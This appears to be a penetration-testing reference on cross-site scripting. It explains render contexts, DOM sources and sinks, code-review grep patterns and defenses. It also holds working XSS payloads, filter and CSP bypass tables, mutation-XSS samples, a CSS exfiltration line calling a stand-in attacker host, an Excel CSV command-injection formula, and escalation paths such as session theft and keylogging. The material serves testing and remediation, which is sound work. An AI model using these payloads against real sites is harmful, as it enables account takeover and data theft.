# Cross-site scripting — technique reference

## 1. Mental model

XSS is a **failure to keep code and data separated in a rendering pipeline**.
There are three render contexts, each with different escape rules:

1. **HTML body** — output is parsed as HTML.
2. **HTML attribute** — output sits inside `<tag attr="...">`.
3. **JavaScript** — output is part of executable JS source.

Plus three injection categories:

- **Reflected** — input from request appears in immediate response.
- **Stored** — input persisted, executes for later viewers.
- **DOM** — sink is in client-side JS reading from a source it shouldn't trust.

And one moving target:

- **Mutation XSS (mXSS)** — DOMPurify / sanitiser output mutates after parse,
  re-introducing executable nodes (notable: `<noscript>` / `<svg>` /
  `<template>` parsing differences).

## 2. Context-driven payloads

### 2.1 HTML body

```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
"><script>alert(1)</script>
```

If `<` or `>` are stripped: not exploitable in HTML body — pivot to other
context or attribute-based break-out.

### 2.2 HTML attribute

If injected into `<input value="HERE">`:

```
" autofocus onfocus=alert(1) x="
```

If injected into `href="HERE"`:

```
javascript:alert(1)
```

If quotes are stripped but injection is unquoted attr:

```
<input value=HERE>   ->   x onmouseover=alert(1)
```

### 2.3 Inside `<script>` block

If injected into a JS string literal:

```
';alert(1);//
</script><svg onload=alert(1)>
```

The `</script>` always escapes — HTML parser closes the script before JS
parsing matters.

### 2.4 Inside event handler (`onclick="..."`)

Double-decode: HTML decode then JS parse. So `&#x27;` becomes `'` in JS.

### 2.5 Inside CSS

```
expression(alert(1))    /* old IE only */
url(javascript:alert(1)) /* deprecated; some old SVG paths */
```

CSS injection mostly leads to data exfil (`background:url(//attacker?stolen=...)`)
not script execution, but combined with `<style>` injection can cause UI
spoofing.

### 2.6 SVG

`<svg>` parses as both XML and HTML; rich attack surface:

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><script>alert(1)</script></svg>
<svg><a><text x="0" y="20">link</text><animate attributeName=href values=javascript:alert(1) /></a></svg>
```

## 3. DOM XSS

Source → sink mismatch. Sources include:

```
location.hash, location.search, location.href, document.URL, document.referrer,
document.cookie, window.name, postMessage event.data, localStorage, sessionStorage,
indexedDB, fetched JSON without proper escaping
```

Sinks include:

```
document.write, innerHTML, outerHTML, insertAdjacentHTML, eval, Function(),
setTimeout(string), setInterval(string), <script>.src, <iframe>.src,
<a>.href = "javascript:...", jQuery(html), $.html(), Vue v-html, React
dangerouslySetInnerHTML, Angular [innerHTML]
```

Detection:

```javascript
// In devtools console — find sources & sinks
performance.getEntriesByType("resource")
  .filter(r => r.name.includes(location.host));

// Tooling: DOM Invader (Burp), Browser DevTools breakpoints on
// Element.innerHTML setter, document.write
```

## 4. Filter-bypass library

| Filter | Payload |
|--------|---------|
| Strips `script` | `<svg onload=alert(1)>`, `<iframe srcdoc=...>` |
| Strips `on*=` | `<svg><animate ...>`, `<form><button formaction=javascript:...>` |
| Strips `(` `)` | `onerror=alert\`1\`` (template-literal call) |
| Strips spaces | `<svg/onload=alert(1)>`, `<svg<onload=alert(1)>` (some parsers) |
| Strips quotes | `<svg onload=alert(1)>` (no quotes needed for single-token attr) |
| HTML entities | `&#x3c;svg&#x20;onload&#x3d;alert(1)&#x3e;` (rarely works in body) |
| Length cap | `<svg/a=b/onload=alert(1)>` minimal; or use `<a href=javascript:...>X</a>` |
| `alert` blocked | `parent.alert(1)`, `top['ale'+'rt'](1)`, `window['\\u0061lert'](1)` |
| `(` blocked | `onerror=alert\`1\``, `<svg><script>alert\`1\`</script>` |
| Single-line filter | use newline: `<svg\nonload\n=\nalert(1)>` |

## 5. CSP bypass

Document the deployed CSP first (`Content-Security-Policy` header). Common
weaknesses:

| CSP weakness | Bypass |
|--------------|--------|
| `unsafe-inline` | direct inline script payload |
| `unsafe-eval` | `eval`, `Function()`, AngularJS `$eval`, Handlebars |
| `*` source | trivially loadable from anywhere |
| `https:` source | host any domain on HTTPS |
| Trusted CDN allowed | use CDN-hosted JSONP, AngularJS template, or known gadget (`https://www.google.com/...?callback=...` styles) |
| `nonce-...` only | nonce reuse if cached pages render same nonce; or DOM-level inheritance via `<base>` |
| `strict-dynamic` | once you reach script execution from any allowed source, you can load further scripts |

Policy lints: `csp-evaluator.withgoogle.com`. Mappings to known gadgets:
github.com/google/csp-evaluator/blob/master/checks/security_checks.ts.

## 6. Mutation XSS

After sanitiser passes, the browser's HTML parser may *mutate* the DOM in ways
that re-introduce script. Examples:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>
<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></a>
```

Test specifically against DOMPurify, sanitize-html, jsoup if any are in the
pipeline. Track CVE feed for sanitiser bypasses.

## 7. Stored XSS — high-value sinks

Always check:

- Profile fields (display name, bio, signature)
- File uploads (filename rendered later, SVG content-type)
- Custom HTTP headers reflected in admin logs (User-Agent, Referer, X-Forwarded-For)
- Webhook URLs that render in admin dashboard
- Comments, tickets, support messages
- Email subject / body if admin renders unsanitised mail
- CSV / XLSX fields if admin opens them with formula execution (Excel CSV
  injection: `=cmd|'/c calc'!A1`)
- DNS / WHOIS data if app trusts and renders it
- Error messages echoed verbatim into admin panel

## 8. Impact escalation

Beyond `alert(1)`:

- **Session theft** — if cookies aren't `HttpOnly`, exfil via `fetch`. If
  HttpOnly: pivot to actions-on-behalf via authenticated XHR.
- **CSRF token theft** — extract from page DOM, perform any state-changing
  action.
- **Account takeover** — change email, then trigger password reset.
- **Keystroke logging** — `addEventListener('keydown', ...)` on login forms.
- **Privilege escalation** — XSS in admin panel via stored content from
  low-priv user.
- **Supply chain** — if XSS lands in a dev console / staging admin, pivot to
  source repo creds.

Capture each escalation as a separate finding linked via a CHAIN.

## 9. Source-code review heuristics

```
grep -rEn "innerHTML|outerHTML|insertAdjacentHTML|document\.write" --include='*.js'
grep -rEn "dangerouslySetInnerHTML"          # React
grep -rEn "v-html"                            # Vue
grep -rEn "\[innerHTML\]"                     # Angular
grep -rEn "\.html\(.*\$"                      # jQuery .html(input)
grep -rEn "eval\(|new Function\(|setTimeout\([^,]+,"
grep -rEn "(\$|Mustache|Handlebars)\.compile"
grep -rEn "window\.location|location\.hash"   # client-side sources
grep -rEn "raw[^_]|safe[^_]|noescape"          # template engines (Twig/Jinja/Liquid)
```

Server-side templating: Jinja `|safe`, Twig `|raw`, Liquid `{{ raw }}`, ERB
`raw`/`html_safe`, JSP `${...}` vs `<c:out>`. Each enables stored XSS if used
on untrusted data.

## 10. Defenses (for remediation)

1. **Output encoding** appropriate to context (HTML / attr / JS / URL / CSS).
2. **Content-Security-Policy** with nonce or hash, `strict-dynamic`,
   no `unsafe-inline`, no `unsafe-eval`, no wildcard.
3. **HttpOnly + Secure + SameSite=Lax/Strict** cookies — limits damage.
4. **Trusted Types** API — modern browsers, requires DOM sink rewriting.
5. **Sanitiser library** (DOMPurify) for unavoidable HTML rendering — treat
   as defense in depth, not primary fix.
6. **CSRF tokens** with `SameSite=Strict` reduces XSS-leveraged abuse.
7. **Input validation** is helpful but not sufficient — encoding at output
   time is the actual fix.

## 11. CWE / standards mapping

- CWE-79 — XSS
- CWE-80 — Reflected XSS into HTML
- CWE-87 — Improper neutralisation of alternate XSS syntax
- CWE-83 — XSS in attribute
- OWASP WSTG WSTG-INPV-01, 02
- OWASP ASVS V5.3
- OWASP Top 10 2021 A03

## 12. Tools

- Burp Suite Pro — XSS Validator extension
- DOM Invader (Burp embedded)
- XSStrike, dalfox — automated reflected XSS
- chromium / playwright + custom harness for DOM XSS at scale
- CSP Evaluator — policy review
